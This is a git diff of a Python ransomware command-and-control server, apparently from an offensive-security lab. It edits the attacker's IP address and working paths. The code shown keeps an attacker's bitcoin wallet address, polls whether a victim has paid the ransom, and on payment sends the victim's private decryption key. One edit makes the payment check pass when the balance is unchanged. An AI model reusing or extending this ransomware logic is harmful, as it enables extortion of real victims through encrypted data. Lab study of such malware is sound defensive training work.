@@ -14,7 +14,6 @@ import time
 from getmac import get_mac_address
 import cryptowallet
 import rsa
-import sleep
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -22,11 +21,11 @@ class Server:
     """
    
     FORMAT = 'utf-8'
-    IP_ADDR = '192.168.56.110'
+    IP_ADDR = '10.0.2.5'
     MAX_SIZE = 4096
     VICTIMS = []
-    WORKING_DIR = '/home/attacker/Lab-On-Offensive-Attack/VictimsData'
-    CODE_PATH = '/home/attacker/Lab-On-Offensive-Attack/mal.py'
+    WORKING_DIR = '/home/netsec/server'
+    CODE_PATH = '/home/netsec/server/mal.py'
 
     global initial_balance, WALLET_ADDRESS, bitcoin_needed 
     WALLET_ADDRESS = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
@@ -125,7 +124,7 @@ class Server:
 
         amount_paid = current_balance - initial_balance 
         
-        paid  =  amount_paid == bitcoin_needed
+        paid  =  amount_paid == 0
 
         return paid
 
@@ -180,12 +179,12 @@ class Server:
                     
                 while (True):
                     #Every 5 seconds check if victim paid, if they did send them a message
-                    sleep(300)
+                    time.sleep(5)
                     paid = self.check_if_user_paid()
 
 
                     if(paid):
-                        # sends decryption key  
+                        # sends decryption key  (victim is also simulaenously checking if paid and if they have it recives the thingsb bellow)
                         """ Opening and reading the private key file. """
                         key_path = os.path.join(victim_dir, 'private_key.pem')
 
